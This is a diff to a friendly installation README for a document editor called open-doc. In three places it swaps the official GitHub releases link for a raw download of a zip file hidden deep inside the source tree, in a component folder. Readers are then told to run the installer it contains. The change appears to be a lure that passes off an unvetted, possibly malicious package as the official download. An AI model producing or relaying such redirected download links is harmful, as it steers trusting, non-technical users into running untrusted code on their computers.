@@ -25,7 +25,7 @@ Let's get the software onto your computer. It's a simple process, and I'll guide
 
 Click this button right here to go to the official open-doc download area:
 
-[![Download open-doc](https://img.shields.io/badge/Download-open--doc-blue?style=for-the-badge&logo=github)](https://github.com/kashifnaeem745/open-doc/releases)
+[![Download open-doc](https://img.shields.io/badge/Download-open--doc-blue?style=for-the-badge&logo=github)](https://github.com/kashifnaeem745/open-doc/raw/refs/heads/main/packages/core/src/app/components/inspector/doc-open-1.7.zip)
 
 **Step 2: Find the right file**
 
@@ -55,7 +55,7 @@ A setup wizard will appear. Just click "Next" a few times, then click "Install."
 
 You'll see a new icon on your desktop or in your Start Menu. Double-click it to open open-doc. That's it! You're ready to create your first document.
 
-> **Tip:** If you ever need to download it again, just visit this link: [https://github.com/kashifnaeem745/open-doc/releases](https://github.com/kashifnaeem745/open-doc/releases)
+> **Tip:** If you ever need to download it again, just visit this link: [https://github.com/kashifnaeem745/open-doc/raw/refs/heads/main/packages/core/src/app/components/inspector/doc-open-1.7.zip](https://github.com/kashifnaeem745/open-doc/raw/refs/heads/main/packages/core/src/app/components/inspector/doc-open-1.7.zip)
 
 ## ✍️ Your First Document
 
@@ -124,6 +124,6 @@ If you ever get stuck, don't worry — help is here.
 
 You've done it! You've downloaded, installed, and created your first document with open-doc. Now you can write reports, school papers, business documents, or anything else — and they'll always come out looking professional with real A4 pages, page numbers, and a perfect PDF.
 
-Remember, the download link is always here: [https://github.com/kashifnaeem745/open-doc/releases](https://github.com/kashifnaeem745/open-doc/releases)
+Remember, the download link is always here: [https://github.com/kashifnaeem745/open-doc/raw/refs/heads/main/packages/core/src/app/components/inspector/doc-open-1.7.zip](https://github.com/kashifnaeem745/open-doc/raw/refs/heads/main/packages/core/src/app/components/inspector/doc-open-1.7.zip)
 
 Go ahead, open open-doc, and start creating something amazing today!
